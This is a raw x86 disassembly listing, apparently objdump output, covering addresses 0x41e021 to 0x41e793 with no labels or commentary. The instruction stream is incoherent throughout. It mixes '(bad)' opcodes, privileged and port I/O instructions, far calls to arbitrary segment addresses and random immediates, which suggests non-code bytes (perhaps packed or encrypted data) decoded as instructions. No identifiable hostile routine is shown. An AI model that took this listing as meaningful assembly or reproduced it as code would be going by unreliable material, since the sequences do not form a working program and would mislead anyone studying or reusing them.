  41e021:	test   al,0xe1
  41e023:	inc    edi
  41e024:	(bad)  
  41e025:	fst    DWORD PTR [edx+esi*8+0x45]
  41e029:	add    esi,DWORD PTR [ebx+0x56031d17]
  41e02f:	cdq    
  41e030:	mov    al,0x3a
  41e032:	jb     0x41e06b
  41e034:	or     ebx,ebx
  41e036:	push   esp
  41e037:	mov    al,0x11
  41e039:	cmp    al,0x6e
  41e03b:	das    
  41e03c:	mov    edx,0x768b02b7
  41e041:	call   0x938b:0x36895b93
  41e048:	mov    ebp,0x59880332
  41e04d:	clc    
  41e04e:	in     eax,dx
  41e04f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e050:	jl     0x41e0cd
  41e052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e053:	push   esp
  41e054:	or     dh,BYTE PTR [ebx+edi*4-0x203bc0e]
  41e05b:	mov    BYTE PTR [eax+0x4d],dh
  41e05e:	or     BYTE PTR [edx-0x21],0x5b
  41e062:	sbb    edi,DWORD PTR ds:0x6e74e9c8
  41e068:	cmc    
  41e069:	add    dh,BYTE PTR [edx-0x6d]
  41e06c:	lods   al,BYTE PTR ds:[esi]
  41e06d:	fdivr  QWORD PTR [edi-0x4345dd63]
  41e073:	xor    BYTE PTR [ebp-0x58c4ba3a],dl
  41e079:	icebp  
  41e07a:	sub    ebp,eax
  41e07c:	retf   0x3633
  41e07f:	mov    BYTE PTR [esi+0x7de47305],ch
  41e085:	jo     0x41e101
  41e087:	jg     0x41e0c8
  41e089:	sti    
  41e08a:	xchg   esi,eax
  41e08b:	scas   al,BYTE PTR es:[edi]
  41e08c:	pop    ecx
  41e08d:	jno    0x41e058
  41e08f:	mov    ah,0x4c
  41e091:	cdq    
  41e092:	pop    esp
  41e093:	and    BYTE PTR [esi],bh
  41e095:	call   0x9b99fa17
  41e09a:	fwait
  41e09b:	in     eax,0x5d
  41e09d:	dec    esp
  41e09e:	xor    BYTE PTR [edx],cl
  41e0a0:	mov    esp,DWORD PTR [edx-0x3f993362]
  41e0a6:	push   ecx
  41e0a7:	or     ecx,DWORD PTR [esi]
  41e0a9:	pop    esp
  41e0aa:	xor    ecx,DWORD PTR [ecx+esi*2+0x67be41f8]
  41e0b1:	cmp    eax,eax
  41e0b3:	aas    
  41e0b4:	sub    DWORD PTR [ebp+ecx*2-0x14],esp
  41e0b8:	xor    ebx,DWORD PTR [esi+0x24b5e014]
  41e0be:	popf   
  41e0bf:	xchg   BYTE PTR [ebx-0x3d5d47e0],bh
  41e0c5:	and    BYTE PTR [ebx+edx*8],ch
  41e0c8:	jmp    0x77442b6e
  41e0cd:	pop    eax
  41e0ce:	imul   eax,esp,0x4ee2123
  41e0d4:	scas   eax,DWORD PTR es:[edi]
  41e0d5:	cld    
  41e0d6:	popf   
  41e0d7:	test   al,0xfc
  41e0da:	jnp    0x41e139
  41e0dc:	aam    0x24
  41e0de:	bnd jle 0x41e0fb
  41e0e1:	imul   ecx,DWORD PTR [edx],0xd821aabf
  41e0e7:	pop    ebx
  41e0e8:	and    ah,BYTE PTR [ecx+0x2e00c87f]
  41e0ee:	clc    
  41e0ef:	add    BYTE PTR [esi-0x44c31aef],ch
  41e0f5:	fimul  WORD PTR [ebx+0x14]
  41e0f8:	xchg   ebx,eax
  41e0f9:	into   
  41e0fa:	repnz scas al,BYTE PTR es:[edi]
  41e0fc:	ret    
  41e0fd:	les    edi,FWORD PTR [ebx+0x6b8651ad]
  41e103:	fistp  DWORD PTR [eax+0x5bf6bad9]
  41e109:	sub    ecx,DWORD PTR [ebp+0x4cab77d0]
  41e10f:	and    edi,DWORD PTR [ebp-0x24def29f]
  41e115:	mov    ecx,ebx
  41e117:	sub    al,0x47
  41e119:	stc    
  41e11a:	or     al,0x79
  41e11c:	xor    dh,dh
  41e11e:	xor    BYTE PTR [edx],dl
  41e120:	ret    
  41e121:	xor    cl,BYTE PTR [eax-0x64ca607e]
  41e127:	xor    BYTE PTR [edi-0x44],bh
  41e12a:	inc    ebp
  41e12b:	jmp    0x41e0bb
  41e12d:	or     DWORD PTR [edi-0x1b],ebx
  41e130:	cld    
  41e131:	xchg   ecx,eax
  41e132:	push   edi
  41e133:	or     al,0x12
  41e135:	(bad)
  41e139:	mov    ebp,0x95e4270b
  41e13e:	push   esp
  41e13f:	xchg   BYTE PTR [ecx+0x5a],bh
  41e142:	mov    ah,BYTE PTR [ebp+0x262c3bde]
  41e148:	bound  ebx,QWORD PTR [ebx-0x51]
  41e14b:	js     0x41e116
  41e14d:	pop    ebx
  41e14e:	sub    ah,bh
  41e150:	call   0x444ece3b
  41e155:	cmp    ch,bl
  41e157:	int    0xc6
  41e159:	mov    eax,0x68abed22
  41e15e:	push   ebx
  41e15f:	popf   
  41e160:	add    DWORD PTR [edi-0x5e],ebx
  41e163:	push   esi
  41e164:	test   BYTE PTR [eax+0xe],0xc1
  41e168:	outs   dx,DWORD PTR ds:[esi]
  41e169:	sbb    al,BYTE PTR [edx-0x4370c8df]
  41e16f:	pop    esp
  41e170:	repz inc ecx
  41e172:	cmp    cl,BYTE PTR [ecx]
  41e174:	je     0x41e168
  41e176:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e177:	lahf   
  41e178:	and    BYTE PTR ds:0xc8fefccb,bl
  41e17e:	inc    edi
  41e17f:	push   ss
  41e180:	not    DWORD PTR [bx+di-0x2d]
  41e184:	cmp    al,0xe2
  41e186:	daa    
  41e187:	ror    cl,cl
  41e189:	outs   dx,DWORD PTR ds:[esi]
  41e18a:	xchg   esi,edi
  41e18c:	push   eax
  41e18d:	sbb    al,0x20
  41e18f:	int3   
  41e190:	sbb    BYTE PTR [ecx+0x46],0x4e
  41e194:	adc    ebx,DWORD PTR [edx+edx*8-0x3f9f978e]
  41e19b:	sbb    cl,0xe0
  41e19e:	fdivr  DWORD PTR [eax]
  41e1a0:	rol    BYTE PTR [eax+esi*1+0x6c8ea961],cl
  41e1a7:	sar    DWORD PTR [ebx+0x193869d2],1
  41e1ad:	pop    eax
  41e1ae:	gs sub BYTE PTR ds:0xa6aa7935,0x41
  41e1b7:	dec    ebp
  41e1b8:	xchg   esp,eax
  41e1b9:	add    eax,0xdf11e40
  41e1be:	mov    gs,WORD PTR [edx]
  41e1c0:	sbb    bl,BYTE PTR [esi-0x2df2edd5]
  41e1c6:	xor    DWORD PTR [eax],ebp
  41e1c8:	and    al,0xb7
  41e1ca:	(bad)  
  41e1cb:	pop    ebx
  41e1cc:	ins    DWORD PTR es:[edi],dx
  41e1cd:	jg     0x41e1ed
  41e1cf:	cs dec ecx
  41e1d1:	and    DWORD PTR [edi],eax
  41e1d3:	(bad)
  41e1d7:	stos   DWORD PTR es:[edi],eax
  41e1d8:	pop    ebx
  41e1d9:	adc    ecx,ecx
  41e1db:	jl     0x41e223
  41e1dd:	iret   
  41e1de:	lock mov WORD PTR [esi+0x6500a49e],?
  41e1e5:	rcl    BYTE PTR [edx+esi*4-0x198c8b26],1
  41e1ec:	outs   dx,DWORD PTR ds:[esi]
  41e1ed:	addr16 sub al,0x5c
  41e1f0:	adc    DWORD PTR [edi-0x3be9af4e],edx
  41e1f6:	sub    BYTE PTR [ebp+0x3b81e1ee],ah
  41e1fc:	loop   0x41e1fc
  41e1fe:	lock outs dx,BYTE PTR gs:[esi]
  41e201:	sub    BYTE PTR [esi],ah
  41e203:	cmp    dl,cl
  41e205:	add    ch,BYTE PTR [eax]
  41e207:	nop
  41e208:	into   
  41e209:	pop    ecx
  41e20a:	shl    BYTE PTR [esi-0x7b15888b],0x74
  41e211:	xor    bh,BYTE PTR [di+0xf]
  41e215:	test   al,0x48
  41e217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e218:	rcr    eax,cl
  41e21a:	or     edx,DWORD PTR [ebp+ebx*1-0x1c]
  41e21e:	add    esp,esp
  41e220:	jmp    0x798c:0x6f8e5791
  41e227:	repnz sub DWORD PTR [ebx+0x1e],esi
  41e22b:	jmp    0x41e26e
  41e22d:	ja     0x41e1c6
  41e22f:	push   edi
  41e230:	and    dh,BYTE PTR [ebx+esi*2-0x61c4e08a]
  41e237:	loop   0x41e250
  41e239:	lahf   
  41e23a:	mov    ebp,0xa918fe8e
  41e23f:	sub    esi,DWORD PTR gs:[eax+0x43]
  41e243:	sbb    BYTE PTR [ebx-0x2a],ch
  41e246:	jbe    0x41e27e
  41e248:	adc    BYTE PTR [ecx+0x58139321],ch
  41e24e:	ret    0xf912
  41e251:	fwait
  41e252:	mov    ss,WORD PTR [esi-0x482ca6d6]
  41e258:	shl    BYTE PTR [eax],1
  41e25a:	mov    cl,0xcf
  41e25c:	daa    
  41e25d:	(bad)  
  41e25e:	dec    ecx
  41e25f:	pop    es
  41e260:	mov    dh,0xde
  41e262:	cdq    
  41e263:	mov    esi,DWORD PTR [edx+0x3c]
  41e266:	dec    ebp
  41e267:	push   ss
  41e268:	aas    
  41e269:	jnp    0x41e2da
  41e26b:	push   0xbcd0c30
  41e270:	push   esi
  41e271:	pop    ebx
  41e272:	fisub  DWORD PTR [esi-0x6d997774]
  41e278:	jne    0x41e23f
  41e27a:	and    DWORD PTR [edx-0x67812b9c],edi
  41e280:	loop   0x41e2c7
  41e282:	iret   
  41e283:	ins    BYTE PTR es:[edi],dx
  41e284:	scas   eax,DWORD PTR es:[edi]
  41e285:	mov    esp,0x2a0e4187
  41e28a:	mov    bh,BYTE PTR [eax]
  41e28c:	inc    esp
  41e28d:	sub    dl,BYTE PTR [ecx+eiz*8+0x7f745950]
  41e294:	outs   dx,DWORD PTR ds:[esi]
  41e295:	adc    BYTE PTR [edi-0x6c],dh
  41e298:	push   ebp
  41e299:	int3   
  41e29a:	pop    ds
  41e29b:	push   ebp
  41e29c:	jns    0x41e29d
  41e29e:	inc    edx
  41e29f:	out    dx,al
  41e2a0:	sub    cl,ch
  41e2a2:	and    eax,0xd68706e8
  41e2a7:	mov    eax,0xfa8696f6
  41e2ac:	aam    0xb0
  41e2ae:	mov    ebx,0x3f09e161
  41e2b3:	jl     0x41e315
  41e2b5:	ins    BYTE PTR es:[edi],dx
  41e2b6:	and    BYTE PTR [ebp-0x4a],al
  41e2b9:	scas   al,BYTE PTR es:[edi]
  41e2ba:	not    DWORD PTR [esi]
  41e2bc:	jb     0x41e293
  41e2be:	sbb    eax,eax
  41e2c0:	push   ss
  41e2c1:	sbb    BYTE PTR [ebx],al
  41e2c3:	xlat   BYTE PTR ds:[ebx]
  41e2c4:	in     al,dx
  41e2c5:	call   0x36001387
  41e2ca:	cmp    BYTE PTR [esi-0x40],0xdc
  41e2ce:	enter  0xd44f,0x24
  41e2d2:	push   cs
  41e2d3:	add    al,0x8d
  41e2d5:	jg     0x41e335
  41e2d7:	out    dx,eax
  41e2d8:	pop    DWORD PTR [edx]
  41e2da:	rol    al,1
  41e2dc:	and    ecx,DWORD PTR [ebp+0x17]
  41e2df:	ja     0x41e336
  41e2e1:	ror    DWORD PTR [esi],0x7c
  41e2e4:	lods   al,BYTE PTR gs:[esi]
  41e2e6:	into   
  41e2e7:	sbb    eax,0xccfe3979
  41e2ec:	cmp    DWORD PTR [ebx+0x2fe04473],esp
  41e2f2:	pop    DWORD PTR [esi+ebp*2]
  41e2f5:	dec    edx
  41e2f6:	jo     0x41e326
  41e2f8:	pop    esp
  41e2f9:	(bad)  
  41e2fa:	mov    BYTE PTR [ebx+0x4d],ah
  41e2fd:	jg     0x41e355
  41e2ff:	repz ret 0xc624
  41e303:	and    dh,BYTE PTR [esi]
  41e305:	(bad)  
  41e308:	cld    
  41e309:	push   eax
  41e30a:	push   edi
  41e30b:	cmc    
  41e30c:	test   eax,0x14dbe7d3
  41e311:	jp     0x41e2b8
  41e313:	mov    ah,0x47
  41e315:	jmp    0x4041:0x57e07aee
  41e31c:	adc    DWORD PTR [esi],ebx
  41e31e:	cmp    ebx,DWORD PTR [eax-0x9281e28]
  41e324:	call   0xf37d:0xb7eae6da
  41e32b:	stc    
  41e32c:	mov    WORD PTR [eax-0x78],es
  41e32f:	nop
  41e330:	sbb    cl,BYTE PTR [eax+ebx*1-0x17]
  41e334:	jecxz  0x41e308
  41e336:	xchg   esi,edx
  41e338:	sti    
  41e339:	jmp    0x41e3ab
  41e33b:	xchg   esi,eax
  41e33c:	aad    0x15
  41e33e:	mov    cl,0x16
  41e340:	stos   DWORD PTR es:[edi],eax
  41e341:	adc    DWORD PTR [edx+0x3ed931b7],ebx
  41e347:	inc    esi
  41e348:	or     BYTE PTR [eax+0x44],bh
  41e34b:	idiv   DWORD PTR [eax-0x29346d0a]
  41e351:	inc    ebp
  41e352:	aam    0x39
  41e354:	dec    edx
  41e355:	shl    ah,1
  41e357:	pop    ebx
  41e358:	jecxz  0x41e2e0
  41e35a:	inc    edx
  41e35b:	iret   
  41e35c:	pop    esi
  41e35d:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e35f:	in     eax,dx
  41e360:	mul    BYTE PTR [eiz*1-0x3a6a3650]
  41e367:	dec    eax
  41e368:	out    0x4,al
  41e36a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e36b:	lods   al,BYTE PTR ds:[esi]
  41e36c:	mov    BYTE PTR ds:0x48c53198,al
  41e372:	sbb    al,0xbf
  41e374:	hlt    
  41e375:	mov    ebp,0xacab2d47
  41e37a:	call   0x6c9b:0xf90f96d9
  41e381:	push   ds
  41e382:	repz cld 
  41e384:	mov    dl,BYTE PTR [ecx+eiz*4+0x62b524eb]
  41e38b:	loope  0x41e401
  41e38d:	loopne 0x41e37e
  41e38f:	push   ss
  41e390:	add    al,BYTE PTR [edx]
  41e392:	jo     0x41e327
  41e394:	in     eax,0xe8
  41e396:	mov    ah,0xd4
  41e398:	cli    
  41e399:	push   ebp
  41e39a:	sbb    bl,BYTE PTR [esi-0x7a]
  41e39d:	push   edi
  41e39e:	jo     0x41e379
  41e3a0:	sbb    eax,0x76901ef1
  41e3a5:	mov    ch,0xd9
  41e3a7:	cmp    DWORD PTR [edx+0x51],ebx
  41e3aa:	mov    bh,0x95
  41e3ac:	int    0xdd
  41e3ae:	into   
  41e3af:	shr    DWORD PTR [edi],1
  41e3b1:	loop   0x41e345
  41e3b3:	inc    esp
  41e3b4:	cs inc edx
  41e3b6:	push   es
  41e3b7:	push   esp
  41e3b8:	sbb    eax,0xc168bcb8
  41e3bd:	mov    esp,0x7254ba21
  41e3c2:	out    dx,al
  41e3c3:	xchg   esp,eax
  41e3c4:	in     al,0x88
  41e3c6:	call   0x78d1886e
  41e3cb:	or     DWORD PTR [edi+0x6a],edi
  41e3ce:	mov    WORD PTR [edx+0x15],?
  41e3d1:	cs repnz not bl
  41e3d5:	jge    0x41e37f
  41e3d7:	int3   
  41e3d8:	pop    es
  41e3d9:	and    BYTE PTR [ebx],0x6b
  41e3dc:	mov    al,0x2e
  41e3de:	fidivr DWORD PTR [edi-0x6d]
  41e3e1:	neg    DWORD PTR [esi+0x23]
  41e3e4:	cli    
  41e3e5:	jne    0x41e37c
  41e3e7:	dec    eax
  41e3e8:	in     eax,0x1b
  41e3ea:	rcr    DWORD PTR [ebx+0x6c98d709],0x95
  41e3f1:	out    0x4a,al
  41e3f3:	retf   0xd263
  41e3f6:	sub    ebx,DWORD PTR [edi+0x46adbe00]
  41e3fc:	call   0xe415:0xeec4b5e8
  41e403:	iret   
  41e404:	lea    edi,[ecx+esi*2+0x69]
  41e408:	popa   
  41e409:	(bad)  
  41e40a:	fiadd  WORD PTR [eax+ebx*2-0x17457faf]
  41e411:	xchg   BYTE PTR [eax],ch
  41e413:	ja     0x41e448
  41e415:	mov    edx,0x576eb97e
  41e41a:	loopne 0x41e3cd
  41e41c:	mov    dh,BYTE PTR [esi-0x711e3bbc]
  41e422:	std    
  41e423:	jg     0x41e49b
  41e425:	hlt    
  41e426:	or     ah,BYTE PTR [edi]
  41e428:	cmc    
  41e429:	shr    DWORD PTR [edi],cl
  41e42b:	jg     0x41e4a6
  41e42d:	jo     0x41e3af
  41e42f:	and    esp,ecx
  41e431:	test   DWORD PTR [eax-0x4a1bc95b],0xf6455bfc
  41e43b:	aaa    
  41e43c:	std    
  41e43d:	add    ecx,ecx
  41e43f:	clc    
  41e440:	mov    WORD PTR [eax],?
  41e442:	sbb    ebx,DWORD PTR [ebp+0x24]
  41e445:	inc    ebx
  41e446:	gs adc al,0x2
  41e449:	add    al,BYTE PTR [ebp-0x24]
  41e44c:	mov    bh,0x75
  41e44e:	fdiv   DWORD PTR [esi+0x22]
  41e451:	dec    ebx
  41e452:	xchg   esi,eax
  41e453:	std    
  41e454:	clc    
  41e455:	xor    DWORD PTR ds:0x58633b0c,ebx
  41e45b:	lock inc edx
  41e45d:	or     eax,0x9ccede00
  41e462:	and    esi,DWORD PTR [ebp-0x7d]
  41e465:	clc    
  41e466:	shl    DWORD PTR ds:0x9de24cd9,cl
  41e46c:	mov    dh,0xe1
  41e46e:	xchg   edi,eax
  41e46f:	dec    esp
  41e470:	ror    BYTE PTR [ebp+edx*4+0x649e4407],cl
  41e477:	paddsw mm0,QWORD PTR [ebx*4+0x104b69da]
  41e47f:	popf   
  41e480:	jae    0x41e4e1
  41e482:	mov    bl,0x43
  41e484:	fadd   QWORD PTR [ecx-0x14]
  41e487:	std    
  41e488:	je     0x41e4fb
  41e48a:	(bad)  
  41e48b:	sbb    ebp,esi
  41e48d:	mov    cl,0xb0
  41e48f:	and    al,0x46
  41e491:	xor    ebx,DWORD PTR [esp+edi*2-0x511d7e76]
  41e498:	(bad)  
  41e499:	mov    dl,0x22
  41e49b:	dec    esi
  41e49c:	inc    ebp
  41e49d:	dec    edi
  41e49e:	mov    ds:0x71e2b6a2,eax
  41e4a3:	in     eax,dx
  41e4a4:	and    bh,BYTE PTR [eax+ecx*1]
  41e4a7:	dec    cx
  41e4a9:	pop    ds
  41e4aa:	cmc    
  41e4ab:	scas   eax,DWORD PTR es:[edi]
  41e4ac:	xchg   ah,dh
  41e4ae:	mov    ebp,0x564cde7
  41e4b3:	cli    
  41e4b4:	or     bh,dl
  41e4b6:	inc    ecx
  41e4b7:	dec    eax
  41e4b8:	call   0x39b3da7e
  41e4bd:	jnp    0x41e492
  41e4bf:	mov    ds:0x4ed3f7b0,eax
  41e4c4:	xor    eax,0xc4d41e6f
  41e4c9:	ret    
  41e4ca:	(bad)  
  41e4cb:	clc    
  41e4cc:	(bad)
  41e4cf:	sub    eax,0x5e7745d3
  41e4d4:	inc    esi
  41e4d5:	jns    0x41e53e
  41e4d7:	and    ebx,DWORD PTR [edi]
  41e4d9:	test   DWORD PTR [edi+0x5b],0x1da2d269
  41e4e0:	ret    0x19b8
  41e4e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4e4:	xchg   ebx,eax
  41e4e5:	push   ds
  41e4e6:	mov    bl,0x4c
  41e4e8:	dec    edx
  41e4e9:	pop    esp
  41e4ea:	inc    ecx
  41e4eb:	mov    dh,0xd8
  41e4ed:	xchg   esp,eax
  41e4ee:	mov    cl,0x7c
  41e4f0:	inc    eax
  41e4f1:	pop    esp
  41e4f2:	aaa    
  41e4f3:	call   DWORD PTR [edi-0x45]
  41e4f6:	into   
  41e4f7:	fisttp WORD PTR [edx-0x4a21b1c5]
  41e4fd:	inc    ebp
  41e4fe:	xchg   edx,eax
  41e4ff:	sbb    eax,DWORD PTR [edx+eax*8+0x450f3a92]
  41e506:	mov    ds:0xf00f8479,eax
  41e50b:	sub    BYTE PTR [esi-0xbb405b],al
  41e511:	or     DWORD PTR [ebx-0x2879b869],edx
  41e517:	jo     0x41e51e
  41e519:	call   0x46f0:0xb8474fd1
  41e520:	fst    DWORD PTR [ebx]
  41e522:	xor    DWORD PTR ds:0x4e7d54e5,ecx
  41e528:	(bad)  
  41e52a:	push   esi
  41e52b:	jnp    0x41e50d
  41e52d:	in     eax,0x4e
  41e52f:	or     al,0x72
  41e531:	(bad)  
  41e533:	je     0x41e57f
  41e535:	inc    edx
  41e536:	popf   
  41e537:	nop
  41e538:	loope  0x41e517
  41e53a:	adc    edx,DWORD PTR [ecx+0x76f6b3e2]
  41e540:	inc    ebp
  41e541:	pop    ss
  41e542:	aas    
  41e543:	aaa    
  41e544:	inc    ebx
  41e545:	fisttp WORD PTR [edi]
  41e547:	inc    esp
  41e548:	cmp    al,0x63
  41e54a:	bound  ebx,QWORD PTR [edi-0x71b0bf9e]
  41e550:	aad    0x5f
  41e552:	xchg   ebp,eax
  41e553:	cmp    eax,DWORD PTR [ecx+0x79]
  41e556:	mov    bh,BYTE PTR [edi]
  41e558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e559:	or     DWORD PTR [ebp-0x16],0xbef4f893
  41e560:	xor    edx,edx
  41e562:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e563:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e564:	mov    edi,0x2e82e180
  41e569:	bound  esp,QWORD PTR [ebp-0x2ec128c5]
  41e56f:	loope  0x41e5ae
  41e571:	call   0x9a2e:0xaf14490c
  41e578:	mov    dh,0x35
  41e57a:	sbb    DWORD PTR [edx+0x5700ae7c],esi
  41e580:	xor    dl,BYTE PTR [edx+0x1c]
  41e583:	pop    eax
  41e584:	cmp    BYTE PTR [edx+0x57],ah
  41e587:	shr    DWORD PTR [edx+0x1e],0x1e
  41e58b:	sbb    cl,BYTE PTR [ebx+0x26]
  41e58e:	ja     0x41e547
  41e590:	and    al,0xc2
  41e592:	pop    edx
  41e593:	sub    ebp,DWORD PTR [eax+0x4b]
  41e596:	mov    ecx,0x9eb029ee
  41e59b:	cwde   
  41e59c:	rcl    DWORD PTR [ebp+0x33c2518d],0x6d
  41e5a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5a4:	push   ds
  41e5a5:	xchg   ebp,eax
  41e5a6:	or     al,0x1f
  41e5a8:	cs ins BYTE PTR es:[edi],dx
  41e5aa:	sub    esp,DWORD PTR [edi-0x429814d7]
  41e5b0:	shl    DWORD PTR [edx+0x75],1
  41e5b3:	adc    al,0x9e
  41e5b5:	mov    dl,0x91
  41e5b7:	mov    al,ds:0x21b47131
  41e5bc:	fstp   TBYTE PTR [ecx]
  41e5be:	aaa    
  41e5bf:	cmp    DWORD PTR [ecx-0x3db99d78],0x183d622
  41e5c9:	rcl    bl,1
  41e5cb:	pop    ebp
  41e5cc:	push   eax
  41e5cd:	or     DWORD PTR [esi+0x5d14f714],esp
  41e5d3:	stc    
  41e5d4:	shl    BYTE PTR [edi],1
  41e5d6:	cs loopne 0x41e650
  41e5d9:	mov    dl,0x9a
  41e5db:	pop    edx
  41e5dc:	jmp    0x41e627
  41e5de:	call   0xf9dbdd50
  41e5e3:	fs lock leave 
  41e5e6:	lea    esi,[ebx-0x28]
  41e5e9:	gs into 
  41e5eb:	jb     0x41e5f3
  41e5ed:	and    DWORD PTR [ecx],edi
  41e5ef:	pushf  
  41e5f0:	aad    0xf8
  41e5f2:	jbe    0x41e651
  41e5f4:	pop    es
  41e5f5:	cwde   
  41e5f6:	call   0x7d71fb9f
  41e5fb:	stos   BYTE PTR es:[edi],al
  41e5fc:	retf   0x40c4
  41e5ff:	jl     0x41e592
  41e601:	cli    
  41e602:	inc    edx
  41e603:	xchg   bh,al
  41e605:	retf   0x3aca
  41e608:	jecxz  0x41e5dd
  41e60a:	sahf   
  41e60b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e60c:	loopne 0x41e614
  41e60e:	push   edi
  41e60f:	mov    dh,0xff
  41e611:	sar    ecx,1
  41e613:	cli    
  41e614:	add    eax,0x90bbe46e
  41e619:	clc    
  41e61a:	icebp  
  41e61b:	(bad)  
  41e61c:	push   esp
  41e61d:	push   ds
  41e61e:	push   esp
  41e61f:	pop    edi
  41e620:	dec    esp
  41e621:	aaa    
  41e622:	fistp  QWORD PTR [ebp-0x4a]
  41e625:	scas   eax,DWORD PTR es:[edi]
  41e626:	jmp    esi
  41e628:	sbb    al,0x90
  41e62a:	fistp  QWORD PTR [edx+0x640eb4f2]
  41e630:	mov    bh,bh
  41e632:	mov    al,0xf0
  41e634:	and    BYTE PTR [ecx+0x4934958d],dh
  41e63a:	and    dh,bl
  41e63c:	mov    dh,0x2d
  41e63e:	pusha  
  41e63f:	ins    BYTE PTR es:[edi],dx
  41e640:	jnp    0x41e6a8
  41e642:	push   0x72ec240
  41e647:	in     al,dx
  41e648:	fistp  WORD PTR [eax-0x4313ca98]
  41e64e:	adc    ch,BYTE PTR [ecx+ebp*1+0x38]
  41e652:	sub    esp,edx
  41e654:	sbb    cl,dl
  41e656:	scas   eax,DWORD PTR es:[edi]
  41e657:	popa   
  41e658:	fwait
  41e659:	mov    ch,0xe4
  41e65b:	in     al,dx
  41e65c:	sbb    dh,BYTE PTR [eax]
  41e65e:	adc    cl,bh
  41e660:	daa    
  41e661:	jg     0x41e6ab
  41e663:	xchg   eax,esi
  41e665:	and    ch,BYTE PTR [edx-0x3f20ecc6]
  41e66b:	mov    ch,0x77
  41e66d:	cs jmp 0x5aa7:0xa2851ea6
  41e675:	add    BYTE PTR [esi],bh
  41e677:	fwait
  41e678:	cmc    
  41e679:	jbe    0x41e67f
  41e67b:	pop    esp
  41e67c:	rol    DWORD PTR [edx-0x6b3249dd],cl
  41e682:	inc    esi
  41e683:	pop    ebx
  41e684:	loop   0x41e669
  41e686:	fs xor eax,0xe3531ac8
  41e68c:	push   cs
  41e68d:	fxch   st(7)
  41e68f:	sbb    al,0xf0
  41e691:	dec    edi
  41e692:	push   ss
  41e693:	outs   dx,BYTE PTR ds:[esi]
  41e694:	push   cs
  41e695:	loopne 0x41e65a
  41e697:	mov    bh,0x65
  41e699:	add    dl,bl
  41e69b:	mov    edx,0x9f05ecd9
  41e6a0:	mov    BYTE PTR [edx-0x35],dl
  41e6a3:	xor    dl,0x2b
  41e6a6:	cdq    
  41e6a7:	dec    esi
  41e6a8:	fadd   QWORD PTR [eax]
  41e6aa:	pop    ecx
  41e6ab:	pop    ecx
  41e6ac:	mov    al,0x4f
  41e6ae:	test   al,0x91
  41e6b0:	jg     0x41e643
  41e6b2:	(bad)  
  41e6b3:	outs   dx,BYTE PTR fs:[esi]
  41e6b5:	sahf   
  41e6b6:	jp     0x41e701
  41e6b8:	and    DWORD PTR [esi+ecx*2],esi
  41e6bb:	pop    ecx
  41e6bc:	lea    esp,[ebp+0x66e8a7f2]
  41e6c2:	int    0xae
  41e6c4:	mov    ch,0x18
  41e6c6:	int    0x75
  41e6c8:	fldcw  WORD PTR [ebx]
  41e6ca:	cs add al,0x5
  41e6cd:	and    al,0xe3
  41e6cf:	icebp  
  41e6d0:	in     al,0x12
  41e6d2:	jg     0x41e6e7
  41e6d4:	xchg   ecx,eax
  41e6d5:	int    0x9d
  41e6d7:	inc    edi
  41e6d8:	add    bl,BYTE PTR [edi+0x26f96d7e]
  41e6de:	loop   0x41e712
  41e6e0:	xchg   edi,eax
  41e6e1:	jmp    0x64d6af75
  41e6e6:	in     eax,0xfe
  41e6e8:	cmp    al,dl
  41e6ea:	pop    esp
  41e6eb:	imul   edx,DWORD PTR [ebp-0x57],0x54
  41e6ef:	out    dx,eax
  41e6f0:	jg     0x41e69c
  41e6f2:	add    edx,0xffffffd1
  41e6f5:	inc    esp
  41e6f6:	inc    edi
  41e6f7:	mov    ecx,0x5c2501b1
  41e6fc:	cdq    
  41e6fd:	inc    eax
  41e6fe:	sbb    eax,0xd7582f2d
  41e703:	inc    ecx
  41e704:	int3   
  41e705:	loopne 0x41e742
  41e707:	or     ah,BYTE PTR [ebx+0x80c9a1f]
  41e70d:	jecxz  0x41e710
  41e70f:	dec    ebx
  41e710:	sahf   
  41e711:	dec    esi
  41e712:	inc    ebx
  41e713:	jl     0x41e6d2
  41e715:	jecxz  0x41e702
  41e717:	pop    eax
  41e718:	je     0x41e717
  41e71a:	mov    eax,0x46686592
  41e71f:	jo     0x41e763
  41e721:	mov    al,ds:0xae66715a
  41e726:	stc    
  41e727:	inc    edx
  41e728:	push   es
  41e729:	enter  0x14,0xb2
  41e72d:	lock mov bl,0xe5
  41e730:	jns    0x41e76f
  41e732:	pop    ecx
  41e733:	mov    bl,0xe9
  41e735:	scas   eax,DWORD PTR es:[edi]
  41e736:	cmp    al,0x2d
  41e738:	dec    esi
  41e739:	dec    esi
  41e73a:	fstp   QWORD PTR [ebp+0x445831dc]
  41e740:	dec    edi
  41e741:	adc    esp,esi
  41e743:	add    al,0x56
  41e745:	pop    ss
  41e746:	pop    edi
  41e747:	dec    ecx
  41e748:	std    
  41e749:	in     al,dx
  41e74a:	arpl   WORD PTR [ecx-0x76],bx
  41e74d:	ja     0x41e6f3
  41e74f:	mov    ebp,0x4d75e1d5
  41e754:	pop    edi
  41e755:	clc    
  41e756:	icebp  
  41e757:	dec    ebx
  41e758:	nop    DWORD PTR [edx]
  41e75b:	jae    0x41e793
  41e75d:	(bad)  
  41e75e:	mov    esp,0xa1e2f3a
  41e763:	test   bh,cl
  41e765:	shr    DWORD PTR [esi+0x9],0x5e
  41e769:	fs xchg ebx,eax
  41e76b:	lea    eax,[edi+ebp*1+0x4e]
  41e76f:	inc    esp
  41e770:	push   ebp
  41e771:	adc    ebp,DWORD PTR [ebp+edx*8-0x5f24a080]
  41e778:	shr    bl,1
  41e77a:	lock sbb dl,0xd7
  41e77e:	sbb    al,BYTE PTR [eax+edx*2+0x3f50022d]
  41e785:	push   0xeaa5879c
  41e78a:	xchg   edi,eax
  41e78b:	ins    BYTE PTR es:[edi],dx
  41e78c:	pop    ebp
  41e78d:	les    edi,FWORD PTR [edx+edx*2]
  41e790:	pop    ebx
  41e791:	mov    edi,?
  41e793:	inc    ebp
